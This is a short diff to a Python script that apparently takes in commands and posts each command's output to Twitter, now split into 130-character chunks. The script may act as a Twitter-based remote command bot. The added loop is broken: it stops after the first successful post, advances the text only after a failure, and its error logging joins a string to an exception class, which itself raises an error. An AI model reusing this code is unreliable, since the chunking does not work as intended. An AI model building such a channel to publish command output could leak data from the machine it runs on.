@@ -148,7 +148,15 @@ if __name__ == "__main__":
 						time.sleep(4)
 
 			else:
-				api.update_status(status = (command + COMMAND_NAME_SEPERATOR + output))
+				text = (username + " " + command + COMMAND_NAME_SEPERATOR + output)
+				while len(text) != 0:
+					try:
+						api.update_status(status = text[:130])
+						break
+					except:
+						log("there is an error: " + sys.exc_info()[0])
+					text = text[130:]
+					time.sleep(1)
 
 	
 		if counter % 3 == 0:
